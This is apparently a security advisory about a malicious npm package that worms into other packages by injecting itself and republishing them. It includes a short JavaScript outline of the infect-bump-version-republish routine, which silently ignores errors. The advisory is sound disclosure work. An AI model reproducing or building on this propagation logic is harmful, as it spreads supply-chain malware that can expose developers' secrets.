  title: Malicious Package
  description: "`sdfjghlkfjdshlkjdhsfg` is a malicious package that infects the\ninstalling
    npm package, infecting them with malicious code and\nrepublishing them with it,
    worming its way into other npm packages.\n\nThis is especially dangerous in production
    runtime environments, where\nenvironment variables tend to consist of keys, passwords,
    tokens and\nother secrets.\n\nPoC:\n\n    function infectModule (moduleName) {\n
    \           installModule(moduleName)\n            .then(() => {\n                    addScript(moduleName);\n
    \                   copyScript(moduleName);\n    \n                    return
    incrementPatchVersion(moduleName);\n            })\n            .then(() => publishInfectedModule(moduleName))\n
    \           .catch(() => {});\n    }\n    \n    const MODULE_NAME = \"sdfjghlkfjdshlkjdhsfg\";\n
    \   \n    infectModule(MODULE_NAME);\n{: .language-js}\n\n"
